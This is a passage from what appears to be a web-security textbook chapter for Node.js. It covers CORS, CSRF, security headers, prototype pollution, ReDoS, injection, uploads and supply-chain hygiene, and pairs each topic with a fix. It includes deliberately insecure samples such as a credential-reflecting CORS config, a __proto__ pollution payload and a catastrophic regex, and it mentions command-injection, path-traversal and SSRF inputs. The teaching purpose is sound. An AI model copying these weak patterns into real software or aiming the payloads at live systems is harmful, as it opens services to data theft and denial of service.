+<p><strong>CORS is not authentication or authorization, and it doesn&#39;t stop requests from reaching your server.</strong> <code>curl</code>, Postman, scripts and attackers ignore it completely. It only controls whether <em>a browser</em> lets <em>page JavaScript</em> read a cross-origin <em>response</em>.</p>
+</blockquote>
+<p>The famous misconfiguration: reflect whatever <code>Origin</code> arrives and allow credentials:</p>
+<div class="code-block"><div class="code-head"><span class="code-lang">JavaScript</span><button type="button" class="code-copy" aria-label="Copy code">Copy</button></div><pre><code class="hljs language-js">app.<span class="hljs-title function_">use</span>(<span class="hljs-string">&#x27;/cors-bad&#x27;</span>,  <span class="hljs-title function_">cors</span>({ <span class="hljs-attr">origin</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">credentials</span>: <span class="hljs-literal">true</span> }));                   <span class="hljs-comment">// &quot;origin: true&quot; reflects any origin</span>
+app.<span class="hljs-title function_">use</span>(<span class="hljs-string">&#x27;/cors-good&#x27;</span>, <span class="hljs-title function_">cors</span>({ <span class="hljs-attr">origin</span>: [<span class="hljs-string">&#x27;https://shop.example.com&#x27;</span>], <span class="hljs-attr">credentials</span>: <span class="hljs-literal">true</span> }));</code></pre></div>
+<pre class="is-plain"><code>/cors-bad/data   Origin: https://evil.example     -&gt; ACAO: https://evil.example      credentials: true   ← ANY site can read a logged-in user's data
+/cors-bad/data   Origin: https://shop.example.com -&gt; ACAO: https://shop.example.com  credentials: true
+/cors-good/data  Origin: https://evil.example     -&gt; ACAO: null                      credentials: true   ← no allow header: browser blocks the read
+/cors-good/data  Origin: https://shop.example.com -&gt; ACAO: https://shop.example.com  credentials: true</code></pre>
+<p><code>/cors-bad</code> lets a script on <code>evil.example</code>, running in a victim&#39;s browser, make an authenticated request (cookies included) and <strong>read the response</strong>. The good config allows only the known origin (the evil one received no <code>Access-Control-Allow-Origin</code>, so a browser would refuse to expose the response). <em>(I verified the headers; browser enforcement itself is by specification, not observed here.)</em></p>
+<p><strong>Rules:</strong> use an <strong>explicit allow-list</strong> of origins; never combine <code>*</code> with credentials (browsers reject it) and never &quot;reflect and allow credentials&quot;; don&#39;t use <code>null</code> as an allowed origin; keep <code>Access-Control-Allow-Methods/Headers</code> minimal; set <code>Vary: Origin</code> when the response varies by origin. If your API uses <code>Authorization: Bearer</code> headers rather than cookies, CSRF disappears (§23.8) but CORS still governs which sites&#39; JavaScript may call it.</p>
+<hr>
+
+<h2 id="23-8-cross-site-request-forgery-csrf">23.8 Cross-Site Request Forgery (CSRF)</h2>
+<p>Browsers <strong>automatically attach cookies</strong> to requests for your domain, <strong>no matter which site triggered the request</strong>. So if Asha is logged in to <code>shop.example.com</code> (session cookie) and visits <code>evil.example</code>, that page can submit a hidden form POST to <code>https://shop.example.com/transfer</code> and the browser helpfully includes her cookie. The server sees a perfectly authenticated request she never intended.</p>
+<pre class="is-plain"><code>v1 forged cross-site request (Origin: evil)       200  {&quot;moved&quot;:5000}                ← money moved</code></pre>
+<p>CSRF only affects <strong>cookie-authenticated</strong> (ambient credential) requests. It doesn&#39;t affect APIs that need an explicit <code>Authorization: Bearer …</code> header set by your own JavaScript (a foreign site can&#39;t make the browser add that).</p>
+<h3 id="layered-defences">Layered defences</h3>
+<ol>
+<li><strong><code>SameSite</code> cookies</strong> (<code>Lax</code> default in modern browsers, <code>Strict</code> for the highest-risk cookies): the browser omits the cookie on most cross-site requests. <em>(Behaviour specified by browsers; not observable without one, so not tested here.)</em> This is the first, strongest layer, but not enough alone (older browsers; same-site subdomain attacks; <code>GET</code> side effects).</li>
+<li><strong>Never change state on <code>GET</code></strong> (Lax allows cookies on top-level <code>GET</code> navigations).</li>
+<li><strong>Verify <code>Origin</code> (or <code>Referer</code>)</strong> on state-changing requests against your own origin.</li>
+<li><strong>CSRF tokens</strong>: a secret per session that the page includes in each state-changing request (header or hidden field). A cross-site page can&#39;t read it (same-origin policy), so it can&#39;t forge the request. Our tokens: <code>HMAC(server-secret, sessionId)</code>.</li>
+</ol>
+<pre class="is-plain"><code>v2 same forged request                         403 {&quot;title&quot;:&quot;bad origin&quot;}
+v2 forged, spoofed good Origin but no token    403 {&quot;title&quot;:&quot;bad csrf token&quot;}
+v2 legit: origin + X-CSRF-Token                200 {&quot;moved&quot;:5000}</code></pre>
+<p>The second line matters: <strong>a spoofed <code>Origin</code> isn&#39;t enough</strong> without the token. (From a <code>curl</code> script anyone can set any Origin; the <em>token</em> is what a cross-site browser attack can&#39;t obtain.) For <strong>SPAs using cookies</strong>, the common patterns are the <em>double-submit cookie</em> or a token returned in a JSON body and sent as a header. Use your framework&#39;s tested implementation (e.g., <code>csrf-csrf</code>, <code>@fastify/csrf-protection</code>) rather than writing your own.</p>
+<aside class="callout callout-memory">
+<h3 id="memory-trick" class="callout-title" data-callout="memory"><span class="callout-ic" aria-hidden="true"><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" focusable="false"><path d="M15 14c.2-1 .7-1.7 1.5-2.5 1-.9 1.5-2.2 1.5-3.5A6 6 0 0 0 6 8c0 1 .2 2.2 1.5 3.5.7.7 1.3 1.5 1.5 2.5"/><path d="M9 18h6"/><path d="M10 22h4"/></svg></span><span>Memory Trick</span></h3>
+<p><strong>XSS = the attacker&#39;s script runs <em>on your site</em>. CSRF = the attacker&#39;s request is sent <em>from their site, with the victim&#39;s cookies</em>.</strong> XSS defeats CSRF defences (the script can read the token), so fix XSS first.</p>
+</aside>
+<hr>
+
+<h2 id="23-9-security-headers-and-helmet">23.9 Security Headers and Helmet</h2>
+<p>Headers tell the browser to turn on protections. <strong>Helmet</strong> sets a good baseline in one line:</p>
+<div class="code-block"><div class="code-head"><span class="code-lang">JavaScript</span><button type="button" class="code-copy" aria-label="Copy code">Copy</button></div><pre><code class="hljs language-js"><span class="hljs-keyword">import</span> helmet <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;helmet&#x27;</span>;
+app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">helmet</span>());</code></pre></div>
+<p>Measured, an Express app <strong>without</strong> Helmet versus <strong>with</strong> it:</p>
+<pre class="is-plain"><code>without helmet: content-security-policy=MISSING strict-transport-security=MISSING x-content-type-options=MISSING x-frame-options=MISSING referrer-policy=MISSING
+
+with helmet   :
+   content-security-policy      default-src 'self';base-uri 'self';font-src 'self' https: data:;form-action 'sel…
+   strict-transport-security    max-age=31536000; includeSubDomains
+   x-content-type-options       nosniff
+   x-frame-options              SAMEORIGIN
+   referrer-policy              no-referrer
+   cross-origin-opener-policy   same-origin
+   x-powered-by                 (absent)</code></pre>
+<div class="table-wrap"><table><thead><tr>
+<th>Header</th>
+<th>What it does</th>
+</tr>
+</thead><tbody><tr>
+<td><strong><code>Content-Security-Policy</code></strong></td>
+<td>Whitelists where scripts/styles/images/frames may load from; blocks inline script by default. The most powerful (and fiddliest) header: a strong second line against XSS. Start in <code>Content-Security-Policy-Report-Only</code> mode</td>
+</tr>
+<tr>
+<td><strong><code>Strict-Transport-Security</code> (HSTS)</strong></td>
+<td>&quot;Only use HTTPS for this domain for N seconds,&quot; preventing downgrade/strip attacks (<a href="/learn/backend-master/how-the-internet-works-dns-tcp-tls" title="How the Internet Works: DNS, TCP &amp; TLS">Chapter 2</a>). Send only over HTTPS</td>
+</tr>
+<tr>
+<td><strong><code>X-Content-Type-Options: nosniff</code></strong></td>
+<td>Browser must trust declared <code>Content-Type</code>; stops &quot;this JSON is HTML&quot; tricks</td>
+</tr>
+<tr>
+<td><strong><code>X-Frame-Options</code> / CSP <code>frame-ancestors</code></strong></td>
+<td>Prevents your pages being embedded in a hostile iframe (<strong>clickjacking</strong>)</td>
+</tr>
+<tr>
+<td><strong><code>Referrer-Policy</code></strong></td>
+<td>Limits URL leakage to other sites</td>
+</tr>
+<tr>
+<td><strong><code>Cross-Origin-Opener-Policy</code> / <code>-Resource-Policy</code></strong></td>
+<td>Cross-origin isolation against side-channel and window-reference attacks</td>
+</tr>
+<tr>
+<td><code>X-Powered-By</code></td>
+<td>Removed (don&#39;t advertise &quot;Express&quot;; also <code>app.disable(&#39;x-powered-by&#39;)</code>)</td>
+</tr>
+</tbody></table></div>
+<p>Notes: for a pure JSON API most of these are harmless but cheap; for HTML pages, CSP needs tuning (your own scripts/CDNs/inline styles), so adopt it deliberately. Helmet&#39;s defaults are a baseline, not a guarantee. Cookies carry their own flags (Chapter 21), and your <strong>reverse proxy/CDN</strong> often sets some of these too (<a href="/learn/backend-master/docker-for-nodejs-dockerfile-compose-kubernetes" title="Docker for Node.js: Dockerfile &amp; Compose">Chapter 31</a>).</p>
+<hr>
+
+<h2 id="23-10-prototype-pollution">23.10 Prototype Pollution</h2>
+<p>In JavaScript, objects inherit from <code>Object.prototype</code>. If attacker-controlled JSON can write to <strong><code>__proto__</code></strong>, they modify the prototype of <em>every object in the process</em>:</p>
+<div class="code-block"><div class="code-head"><span class="code-lang">JavaScript</span><button type="button" class="code-copy" aria-label="Copy code">Copy</button></div><pre><code class="hljs language-js"><span class="hljs-keyword">const</span> <span class="hljs-title function_">naiveMerge</span> = (<span class="hljs-params">t, s</span>) =&gt; { <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> k <span class="hljs-keyword">in</span> s) { <span class="hljs-keyword">if</span> (s[k] &amp;&amp; <span class="hljs-keyword">typeof</span> s[k] === <span class="hljs-string">&#x27;object&#x27;</span>) { t[k] ??= {}; <span class="hljs-title function_">naiveMerge</span>(t[k], s[k]); } <span class="hljs-keyword">else</span> t[k] = s[k]; } <span class="hljs-keyword">return</span> t; };
+<span class="hljs-keyword">const</span> evil = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-string">&#x27;{&quot;__proto__&quot;: {&quot;isAdmin&quot;: true}}&#x27;</span>);      <span class="hljs-comment">// JSON.parse creates a real own property named &quot;__proto__&quot;</span></code></pre></div>
+<pre class="is-plain"><code>before: ({}).isAdmin = undefined
+after naiveMerge(evil): ({}).isAdmin = true   &lt;- EVERY object now has isAdmin
+after safeMerge: ({}).isAdmin = undefined</code></pre>
+<p>After one request to a route that deep-merges a request body into a config or options object, <strong>every plain object in the server</strong> reports <code>isAdmin === true</code>; any later check like <code>if (user.isAdmin)</code> on an object that simply <em>lacks</em> the property now passes. Depending on the code, this escalates to authorization bypass, denial of service, or even remote code execution (famous incidents in lodash <code>merge</code>/<code>defaultsDeep</code>, <code>jQuery.extend</code>, and others).</p>
+<p><strong>Fixes:</strong> (a) skip dangerous keys (<code>__proto__</code>, <code>constructor</code>, <code>prototype</code>) in any recursive merge/set-by-path function, as <code>safeMerge</code> does; (b) use <code>Object.create(null)</code> or <code>Map</code> for dictionaries built from user keys; (c) validate input with a <strong>strict schema</strong> (Zod) <em>before</em> merging, so unknown keys never arrive; (d) keep dependencies updated (many libraries patched this); (e) run Node with <code>--disable-proto=delete</code> in high-risk code; (f) use <code>Object.hasOwn(obj, k)</code> instead of truthiness checks for permissions. (I demonstrated the pollution and <code>safeMerge</code>; the Node flag and lodash incidents are from documentation.)</p>
+<hr>
+
+<h2 id="23-11-denial-of-service-regular-expressions-and-resource-limits">23.11 Denial of Service: Regular Expressions and Resource Limits</h2>
+<h3 id="redos">ReDoS</h3>
+<p>A <strong>regular expression with nested quantifiers</strong> can take <em>exponential</em> time on certain inputs. Node runs your JavaScript on <strong>one thread</strong> (<a href="/learn/backend-master/nodejs-event-loop-streams-worker-threads" title="Node.js Event Loop, Streams &amp; Threads">Chapter 5</a>), so one evil request freezes <em>every</em> user:</p>
+<div class="code-block"><div class="code-head"><span class="code-lang">JavaScript</span><button type="button" class="code-copy" aria-label="Copy code">Copy</button></div><pre><code class="hljs language-js">/^(a+)+$/.<span class="hljs-title function_">test</span>(<span class="hljs-string">&#x27;a&#x27;</span>.<span class="hljs-title function_">repeat</span>(n) + <span class="hljs-string">&#x27;!&#x27;</span>)       <span class="hljs-comment">// looks innocent; &quot;email validation&quot; regexes often have this shape</span></code></pre></div>
+<pre class="is-plain"><code>/^(a+)+$/ on 20 a's + &quot;!&quot;   -&gt;   172.7 ms        (first calls include warm-up, so the smallest sizes look flat)
+/^(a+)+$/ on 24 a's + &quot;!&quot;   -&gt;   162.4 ms
+/^(a+)+$/ on 26 a's + &quot;!&quot;   -&gt;   689.5 ms
+/^(a+)+$/ on 28 a's + &quot;!&quot;   -&gt;  3206.9 ms        ← each +2 characters ≈ ×4
+safe equivalent /^a+$/ on a 31-char input   -&gt;  0.063 ms
+an innocent request sent just before a 28-char evil input took 2532 ms
+   (the evil regex held the event loop for 2520 ms)</code></pre>
+<p>Each two extra characters about quadruples the time (earlier runs: 30 characters ≈ 10–11 seconds). The last line is the real damage: <strong>an unrelated, innocent request waited 2.5 seconds</strong> because the evil regex occupied the only thread. A few such requests per minute would take a service down.</p>
+<p><strong>Defences:</strong> avoid nested quantifiers and overlapping alternations (<code>(a+)+</code>, <code>(a|a)*</code>, <code>(.*)*</code>); <strong>cap input length <em>before</em> matching</strong> (a 50-character email-like string can&#39;t hurt); prefer simple parsers/validators (Zod, <code>validator.js</code>) over home-made regexes; use a linear-time engine (<strong>RE2</strong>, <code>re2</code> npm) for untrusted patterns; lint with <code>eslint-plugin-regexp</code>/<code>safe-regex</code>; and run CPU-heavy work off the main thread (worker threads, <a href="/learn/backend-master/nodejs-event-loop-streams-worker-threads" title="Node.js Event Loop, Streams &amp; Threads">Chapter 5</a>).</p>
+<h3 id="other-resource-exhaustion-limits-set-them-all">Other resource-exhaustion limits (set them all)</h3>
+<pre class="is-plain"><code>5 KB body vs 1 KB limit  -&gt;  413 {&quot;title&quot;:&quot;entity.too.large&quot;}      (express.json({ limit: '1kb' }))
+malformed JSON           -&gt;  400</code></pre>
+<ul>
+<li>Request <strong>body size</strong> (<code>express.json({ limit })</code>), <strong>JSON depth</strong>, <strong>upload size</strong>, <strong>query-string/array length</strong>, header size.</li>
+<li><strong>Timeouts</strong>: request, headers, keep-alive, database statement (<a href="/learn/backend-master/database-fundamentals-acid-cap-mvcc" title="Database Fundamentals: ACID, CAP &amp; MVCC">Chapter 12</a>), outbound calls (<code>AbortSignal.timeout</code>).</li>
+<li><strong>Pagination caps</strong> (<code>limit ≤ 100</code>, <a href="/learn/backend-master/rest-api-design-pagination-idempotency-versioning" title="REST API Design: Pagination &amp; Idempotency">Chapter 8</a>), GraphQL depth/cost limits (<a href="/learn/backend-master/graphql-api-nodejs-dataloader-security" title="GraphQL with Node.js: DataLoader &amp; Limits">Chapter 9</a>).</li>
+<li><strong>Rate limiting</strong> (Chapters <a href="/learn/backend-master/express-5-fastify-validation-zod-security-middleware" title="Express 5 &amp; Fastify: Validation &amp; Security">7</a>, 19) and connection limits per client.</li>
+<li><strong>Slow hashing is a DoS vector too</strong>: cap password length (Chapter 21).</li>
+</ul>
+<hr>
+
+<h2 id="23-12-injection-recapped">23.12 Injection, Recapped</h2>
+<p>The most important single rule across the book: <strong>never build a query or command by concatenating user input.</strong></p>
+<div class="table-wrap"><table><thead><tr>
+<th>Target</th>
+<th>Safe pattern</th>
+<th>Chapter</th>
+</tr>
+</thead><tbody><tr>
+<td>SQL</td>
+<td>Parameters (<code>$1</code>), whitelist identifiers</td>
+<td>13, 15</td>
+</tr>
+<tr>
+<td>MongoDB</td>
+<td>Validate <em>types</em> (no operator objects), <code>sanitizeFilter</code></td>
+<td>18</td>
+</tr>
+<tr>
+<td>Shell</td>
+<td><code>execFile</code> + args array</td>
+<td>23</td>
+</tr>
+<tr>
+<td>HTML</td>
+<td>Contextual output encoding</td>
+<td>23</td>
+</tr>
+<tr>
+<td>LDAP, XPath, headers, logs</td>
+<td>The library&#39;s escaping/params; strip CR/LF from anything placed in headers or logs (<strong>log injection / header injection</strong>)</td>
+<td></td>
+</tr>
+<tr>
+<td>Templates</td>
+<td>Never render user-supplied template <em>source</em></td>
+<td></td>
+</tr>
+<tr>
+<td>Regex</td>
+<td>Never build a regex from user input without escaping (<code>escapeRegExp</code>)</td>
+<td>23</td>
+</tr>
+</tbody></table></div>
+<hr>
+
+<h2 id="23-13-file-uploads-described-not-run-in-this-chapter">23.13 File Uploads <em>(Described; not run in this chapter)</em></h2>
+<p>Uploads are a classic attack surface:</p>
+<ul>
+<li><strong>Limit size</strong> at the proxy and in the app; <strong>limit count</strong>; stream to storage rather than buffering.</li>
+<li><strong>Don&#39;t trust the filename or <code>Content-Type</code></strong> (the client chooses both). Check <strong>magic bytes</strong> (file signatures) and re-encode images server-side (this also strips embedded payloads and metadata).</li>
+<li><strong>Generate the stored name yourself</strong> (random id); never use the client&#39;s name for paths (traversal) or serve user files from your main origin (XSS via uploaded HTML/SVG). Serve from a <strong>separate domain</strong> with <code>Content-Disposition: attachment</code> and <code>nosniff</code>.</li>
+<li><strong>Scan for malware</strong> if files are shared; store outside the web root, preferably in <strong>object storage</strong> (<a href="/learn/backend-master/full-text-search-time-series-olap-object-storage" title="Search, OLAP, Time-Series &amp; Object Storage">Chapter 20</a>) with presigned URLs.</li>
+<li>Limit decompression (zip/PNG &quot;bombs&quot;) and image dimensions.</li>
+</ul>
+<hr>
+
+<h2 id="23-14-secrets-dependencies-and-supply-chain">23.14 Secrets, Dependencies and Supply Chain</h2>
+<h3 id="secrets">Secrets</h3>
+<ul>
+<li><strong>Never commit secrets</strong> (keys, passwords, tokens, <code>.env</code> files) to Git, and remember <em>history</em> keeps them: a committed-then-deleted key must be <strong>rotated</strong>, not just removed. Use a pre-commit/CI secret scanner (gitleaks, trufflehog) <em>(not run here)</em>.</li>
+<li>Load secrets from <strong>environment variables or a secret manager</strong> (AWS Secrets Manager, GCP Secret Manager, Vault, Doppler), injected at runtime (Chapters <a href="/learn/backend-master/linux-terminal-git-for-backend-developers" title="Linux, Terminal &amp; Git for Backend Devs">4</a> and 31); validate config at startup; <strong>never log them</strong>; give each environment different secrets; make rotation routine.</li>
+<li>Use <strong>separate credentials per service</strong> with least privilege (the app&#39;s DB user can&#39;t <code>DROP TABLE</code>).</li>
+<li>In errors/logs, <strong>redact</strong> <code>Authorization</code>, cookies, passwords, tokens, and PII.</li>
+</ul>
+<h3 id="dependencies-the-supply-chain">Dependencies (the supply chain)</h3>
+<p>Your app is mostly <em>other people&#39;s code</em>. Risks: known-vulnerable packages, <strong>typosquatting</strong> (<code>reqeust</code>), <strong>malicious updates</strong>, abandoned packages, install scripts.</p>
+<ul>
+<li><strong>Run <code>npm audit</code></strong> in CI; I ran it on the packages used for this chapter&#39;s auth work:</li>
+</ul>
+<pre class="is-plain"><code>$ npm audit --omit=dev
+found 0 vulnerabilities</code></pre>
+<p>  (At that moment, for those packages. It&#39;s a snapshot, not a guarantee: new advisories appear daily; audit regularly.)</p>
+<ul>
+<li><strong>Commit the lockfile</strong> and install with <code>npm ci</code> for reproducible builds; pin/limit version ranges deliberately; review dependency updates (Dependabot/Renovate) instead of blind <code>latest</code>.</li>
+<li>Prefer <strong>fewer, well-maintained</strong> dependencies; check maintainers, downloads, recent activity; be wary of tiny packages for trivial tasks (see the 2016 <code>left-pad</code> incident, an 11-line package whose removal broke much of the JavaScript ecosystem).</li>
+<li>Consider <code>--ignore-scripts</code> for untrusted installs, <code>npm provenance</code>, and SBOM generation for compliance. Keep <strong>Node and the OS image patched</strong> (Equifax lesson).</li>
+</ul>
+<hr>
+
+<h2 id="23-15-logging-errors-and-monitoring-for-security">23.15 Logging, Errors and Monitoring for Security</h2>
+<ul>
+<li><strong>Don&#39;t leak internals</strong>: return generic error bodies in production (no stack traces, SQL, file paths); log details server-side with a <strong>correlation id</strong> (<a href="/learn/backend-master/logging-monitoring-tracing-nodejs-observability" title="Logging, Monitoring &amp; Tracing in Node.js">Chapter 25</a>). Our error handler returns <code>{&quot;title&quot;:&quot;entity.too.large&quot;}</code>-style minimal bodies.</li>
+<li><strong>Log security events</strong>: failed logins, permission denials, rate-limit hits, token reuse (Chapter 21), admin actions: <em>without</em> logging secrets. Alert on spikes (credential stuffing, enumeration, 403/404 storms from one IP/user).</li>
+<li>Protect log injection: strip newlines from user-controlled values.</li>
+<li>Have an <strong>incident plan</strong>: who rotates keys, how to revoke all sessions, how to notify users.</li>
+</ul>
+<hr>
+
+<h2 id="23-16-owasp-top-10-map-2021-to-this-book">23.16 OWASP Top 10 Map (2021) to This Book</h2>
+<div class="table-wrap"><table><thead><tr>
+<th>OWASP 2021</th>
+<th>Where covered</th>
+</tr>
+</thead><tbody><tr>
+<td>A01 Broken Access Control</td>
+<td>Ch 22 (BOLA, BFLA, mass assignment, RLS)</td>
+</tr>
+<tr>
+<td>A02 Cryptographic Failures</td>
+<td>Ch 21 (hashing, TLS/HSTS), Ch 2</td>
+</tr>
+<tr>
+<td>A03 Injection</td>
+<td>Ch 13, 18, 23 (SQL, NoSQL, command, XSS)</td>
+</tr>
+<tr>
+<td>A04 Insecure Design</td>
+<td>Ch 11 (architecture), threat modelling; this chapter&#39;s mindset</td>
+</tr>
+<tr>
+<td>A05 Security Misconfiguration</td>
+<td>Ch 23 (CORS, headers, defaults), Ch 31</td>
+</tr>
+<tr>
+<td>A06 Vulnerable &amp; Outdated Components</td>
+<td>§23.14 (audit, lockfiles, patching)</td>
+</tr>
+<tr>
+<td>A07 Identification &amp; Authentication Failures</td>
+<td>Ch 21</td>
+</tr>
+<tr>
+<td>A08 Software &amp; Data Integrity Failures</td>
+<td>§23.14, CI/CD (Ch 32), prototype pollution</td>
+</tr>
+<tr>
+<td>A09 Security Logging &amp; Monitoring Failures</td>
+<td>§23.15, Ch 25</td>
+</tr>
+<tr>
+<td>A10 Server-Side Request Forgery</td>
+<td>§23.5</td>
+</tr>
+</tbody></table></div>
+<hr>
+
+<h2 id="23-17-edge-cases-and-gotchas-checklist">23.17 Edge Cases and Gotchas Checklist</h2>
+<ul>
+<li><input disabled="" type="checkbox"> Any place user data is placed in HTML/JS/URL/CSS/shell/SQL/regex/template without the matching encoding.</li>
+<li><input disabled="" type="checkbox"> <code>innerHTML</code>/<code>dangerouslySetInnerHTML</code>/<code>v-html</code>/<code>|safe</code> with user content; homemade sanitisers.</li>
+<li><input disabled="" type="checkbox"> <code>exec(string)</code> with user input; <code>eval</code>/<code>new Function</code>; user-controlled template source.</li>
+<li><input disabled="" type="checkbox"> <code>path.join</code> with user input and no containment check; prefix check without the trailing separator.</li>
+<li><input disabled="" type="checkbox"> Server-side fetches of user URLs without allow-list/private-IP block/redirect control/timeouts; reliance on string blocklists; no IMDSv2.</li>
+<li><input disabled="" type="checkbox"> <code>redirect(req.query.next)</code>; loose <code>redirect_uri</code> matching.</li>
+<li><input disabled="" type="checkbox"> CORS: reflecting origins, <code>credentials: true</code> with wildcard/reflection, allowing <code>null</code>.</li>
+<li><input disabled="" type="checkbox"> Cookie-authenticated state changes with no CSRF defence; side effects on GET.</li>
+<li><input disabled="" type="checkbox"> Missing Helmet/CSP/HSTS/nosniff; <code>X-Powered-By</code> exposed.</li>
+<li><input disabled="" type="checkbox"> Deep-merge/<code>set</code> by path on user data; <code>{}</code> used as a dictionary keyed by user input.</li>
+<li><input disabled="" type="checkbox"> Nested-quantifier regexes on user input; unbounded input length.</li>
+<li><input disabled="" type="checkbox"> No body/upload/query/JSON-depth limits; no timeouts; unbounded pagination.</li>
+<li><input disabled="" type="checkbox"> Secrets in Git/logs/images; shared credentials; never rotated.</li>
+<li><input disabled="" type="checkbox"> No lockfile/<code>npm ci</code>; no audit; blind <code>latest</code>.</li>
+<li><input disabled="" type="checkbox"> Stack traces or SQL errors returned to clients.</li>
+<li><input disabled="" type="checkbox"> Browser-only security tested nowhere: add header tests and a browser/E2E check for CSP and cookies (<a href="/learn/backend-master/backend-testing-strategy-node-test-integration-property" title="Backend Testing Strategy: Node.js Guide">Chapter 24</a>).</li>
+</ul>
+<hr>
+
+<h2 id="23-18-chapter-summary">23.18 Chapter Summary</h2>
+<ul>
+<li>Almost every web vulnerability is <strong>data treated as code</strong>: encode on output, validate on input, parameterise, never concatenate.</li>
+<li><strong>XSS</strong>: encode output (v1 echoed <code>&lt;script&gt;</code>; v2 produced <code>&amp;lt;script&amp;gt;</code>); sanitise user HTML with DOMPurify; CSP and <code>HttpOnly</code> as second layers; no tokens in <code>localStorage</code>.</li>
+<li><strong>Path traversal</strong> (<code>../secret.txt</code> leaked): <code>path.resolve</code> + <code>startsWith(base + sep)</code>. <strong>Command injection</strong> (<code>; echo INJECTED</code> ran): <code>execFile</code> with args, no shell.</li>
+<li><strong>SSRF</strong>: v1 returned an internal secret through <code>127.0.0.1</code>, <code>localhost</code> and the decimal <code>2130706433</code>; the fix resolves DNS, <strong>blocks private IPs</strong>, uses an <strong>allow-list</strong>, refuses redirects, sets timeouts. DNS rebinding remains: use egress filtering. <strong>Open redirects</strong>: allow only single-slash relative paths.</li>
+<li><strong>CORS</strong> is a <em>browser</em> read-permission, not a firewall: reflecting origins with credentials let any site read private data; use an explicit allow-list. <strong>CSRF</strong>: <code>SameSite</code> + Origin check + token; a spoofed Origin without the token was refused.</li>
+<li><strong>Helmet</strong> adds CSP, HSTS, nosniff, frame protection and removes <code>X-Powered-By</code> (all missing by default).</li>
+<li><strong>Prototype pollution</strong> (<code>{&quot;__proto__&quot;: …}</code> made <em>every</em> object <code>isAdmin</code>) → skip dangerous keys, strict schemas. <strong>ReDoS</strong> (<code>/^(a+)+$/</code>): 28 chars ≈ 3.2 s, and an innocent request waited 2.5 s behind it → safe regexes, length caps, RE2.</li>
+<li>Set <strong>size/time/depth/rate limits</strong> everywhere; keep <strong>secrets</strong> out of Git; <strong>audit and lock dependencies</strong>; log security events without leaking; map to the <strong>OWASP Top 10</strong>.</li>
+</ul>
+<hr>
+
+<h2 id="23-19-revision-notes">23.19 Revision Notes</h2>
+<ul>
+<li>Encode on output (HTML/URL/JS/CSS), parameterise queries, <code>execFile</code> args, no <code>eval</code>.</li>
+<li><code>resolve</code> + <code>startsWith(base + path.sep)</code>; id-based storage names.</li>
+<li>SSRF: allow-list, resolve DNS then check IP (private/loopback/link-local/IPv6), <code>redirect: &#39;manual&#39;</code>, timeout; egress firewall; IMDSv2.</li>
+<li>Redirects: <code>^/(?!/|\\)…</code> or token map. CORS: explicit origins, never reflect+credentials.</li>
+<li>CSRF: <code>SameSite=Lax/Strict</code>, Origin check, per-session token, no state change on GET.</li>
+<li>Helmet: CSP, HSTS, nosniff, frame-ancestors, referrer-policy; <code>app.disable(&#39;x-powered-by&#39;)</code>.</li>
+<li>Never merge <code>__proto__</code>/<code>constructor</code>/<code>prototype</code>; <code>Object.create(null)</code>; strict schemas.</li>
+<li>ReDoS: no nested quantifiers, length cap, RE2.</li>
+<li>Limits: body, upload, depth, timeouts, rate, pagination.</li>
+<li>Secrets: env/secret manager, rotate; <code>npm ci</code> + <code>npm audit</code>; lockfile.</li>
+</ul>
+<hr>
+
+<h2 id="23-20-mind-map-ascii">23.20 Mind Map (ASCII)</h2>
+<pre class="is-plain"><code>                          WEB &amp; API SECURITY
+                                  │
+   ┌──────────┬──────────┬────────┼─────────┬───────────┬────────────┐
+ BROWSER    INPUT→CODE   NETWORK   RUNTIME   LIMITS     SUPPLY      HEADERS
+   │           │          │          │         │          │            │
+ XSS        SQL/NoSQL    SSRF     prototype  body/time  secrets     CSP, HSTS
+ CSRF       command      open     pollution  rate       npm audit   nosniff
+ CORS       path trav.   redirect ReDoS      uploads    lockfile    frame-ancestors
+ clickjack  templates    DNS rebind                      SBOM        Helmet</code></pre>
+<hr>
+
+<h2 id="23-21-cheat-sheet">23.21 Cheat Sheet</h2>
+<div class="code-block"><div class="code-head"><span class="code-lang">JavaScript</span><button type="button" class="code-copy" aria-label="Copy code">Copy</button></div><pre><code class="hljs language-js">app.<span class="hljs-title function_">disable</span>(<span class="hljs-string">&#x27;x-powered-by&#x27;</span>); app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">helmet</span>()); app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">json</span>({ <span class="hljs-attr">limit</span>: <span class="hljs-string">&#x27;10kb&#x27;</span> }));
+<span class="hljs-keyword">const</span> full = path.<span class="hljs-title function_">resolve</span>(base, userPath); <span class="hljs-keyword">if</span> (!full.<span class="hljs-title function_">startsWith</span>(base + path.<span class="hljs-property">sep</span>)) <span class="hljs-title function_">reject</span>();
+<span class="hljs-keyword">await</span> <span class="hljs-title function_">execFile</span>(<span class="hljs-string">&#x27;tool&#x27;</span>, [arg1, arg2]);                                  <span class="hljs-comment">// never exec(`tool ${x}`)</span>
+<span class="hljs-comment">// SSRF:  new URL → dns.lookup({all:true}) → reject private → allow-list → fetch(u,{redirect:&#x27;manual&#x27;,signal:AbortSignal.timeout(3000)})</span>
+<span class="hljs-comment">// redirect: /^\/(?!\/|\\)[\w\-./?=&amp;]*$/.test(next) ? next : &#x27;/&#x27;</span>
+<span class="hljs-comment">// CORS:  cors({ origin: [&#x27;https://shop.example.com&#x27;], credentials: true })</span>
+<span class="hljs-comment">// CSRF:  SameSite=Lax + check Origin + X-CSRF-Token (HMAC of session)</span>
+<span class="hljs-comment">// merge: skip &#x27;__proto__&#x27; | &#x27;constructor&#x27; | &#x27;prototype&#x27;</span>
+<span class="hljs-comment">// shell: npm ci &amp;&amp; npm audit --omit=dev ; gitleaks detect</span></code></pre></div>
+<hr>
+
+<h2 id="23-22-key-takeaways">23.22 Key Takeaways</h2>
+<ol>
+<li><strong>Data must never become code</strong>: encode, parameterise, no shell, no <code>eval</code>.</li>
+<li><strong>Your server is inside the firewall</strong>: treat every user-supplied URL and path as hostile.</li>
+<li><strong>CORS ≠ security boundary</strong>; CSRF only matters for cookie auth, and needs layered defences.</li>
+<li><strong>One regex or one merge can take the whole process down or up</strong>: limit and validate.</li>
